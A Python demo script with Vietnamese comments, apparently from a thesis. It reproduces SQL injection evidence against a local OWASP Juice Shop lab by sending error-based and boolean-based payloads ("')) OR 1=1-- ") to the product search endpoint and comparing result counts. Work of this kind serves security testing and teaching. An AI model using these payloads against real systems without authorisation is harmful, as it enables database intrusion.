# -*- coding: utf-8 -*-
"""Demo bao ve: tai hien TRUC TIEP bang chung SQL Injection tren OWASP Juice Shop.

Chay bang chinh cong cu cua he thong (app.tools.WebTools) qua dung logic oracle
trong app/labs.py, in ra tung buoc va nhat ky request that -> khop voi anh bang
chung trong luan van (Hinh TN1 - Juice Shop).

Cach chay:
    docker compose up -d juice-shop           # bat lab Juice Shop o cong 3000
    python demo/demo_bangchung_sqli.py
"""
import json
import re
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from app.tools import WebTools

BASE = "http://localhost:3000"
URL = BASE + "/rest/products/search"
SQL_ERROR = re.compile(r"SQLITE_ERROR|SequelizeDatabaseError|syntax error", re.I)


def count(resp):
    try:
        d = json.loads(resp["body"])
        return len(d["data"]) if isinstance(d.get("data"), list) else None
    except Exception:
        return None


def line(tag):
    print("\n=== " + tag + " ===")


def main():
    tools = WebTools(BASE)
    tools.request_log = []

    line("BUOC 1 - DIEM TIEM UNG VIEN (recon)")
    r = tools.request(URL, params={"q": "apple"})
    print("GET " + r["url"])
    print("--> HTTP %d  | so san pham = %s" % (r["status"], count(r)))
    print("Oracle: tham so q co phan chieu ket qua -> chon lam diem tiem")

    line("BUOC 2 - YEU CAU NEN (baseline)")
    base = tools.request(URL, params={"q": "sentinel-no-match"})
    print("GET " + base["url"])
    print("--> HTTP %d  | so san pham = %s" % (base["status"], count(base)))

    line("BUOC 3 - THAM DO ERROR-BASED (dau nhay don)")
    single = tools.request(URL, params={"q": "'"})
    sig = SQL_ERROR.search(single["body"])
    print("GET " + single["url"])
    print("--> HTTP %d  | chu ky loi SQL: %s" % (single["status"], "CO" if sig else "KHONG"))
    print("Oracle: khong co error-signature -> chuyen sang kiem chung boolean")

    line("BUOC 4 - CAP TRUE/FALSE (boolean-based)")
    t = tools.request(URL, params={"q": "sentinel-no-match')) OR 1=1-- "})
    f = tools.request(URL, params={"q": "sentinel-no-match')) OR 1=2-- "})
    print("true  OR 1=1-- --> HTTP %d  | so san pham = %s" % (t["status"], count(t)))
    print("false OR 1=2-- --> HTTP %d  | so san pham = %s" % (f["status"], count(f)))

    line("BUOC 5 - ORACLE KET LUAN (tat dinh)")
    counts = [count(base), count(t), count(f)]
    ok = counts[0] == counts[2] == 0 and counts[1] > 0
    print("counts = [baseline=%s, true=%s, false=%s]" % tuple(counts))
    print("Dieu kien counts[0]==counts[2]==0 and counts[1]>0  => %s" % ("DUNG" if ok else "SAI"))
    if ok:
        print('==> Finding(category="SQL Injection", severity="high", parameter="q")')

    line("BUOC 6 - NHAT KY REQUEST THAT (Proof-of-Concept)")
    for e in tools.request_log:
        print("[%s] %s %s -> HTTP %d" % (e["ts"], e["method"], e["url"], e["status"]))

    print("\n>> Day la du lieu TRUC TIEP tu Juice Shop qua WebTools cua he thong, "
          "khong phai go tay. Khop voi anh bang chung TN1 - Juice Shop trong luan van.")


if __name__ == "__main__":
    main()
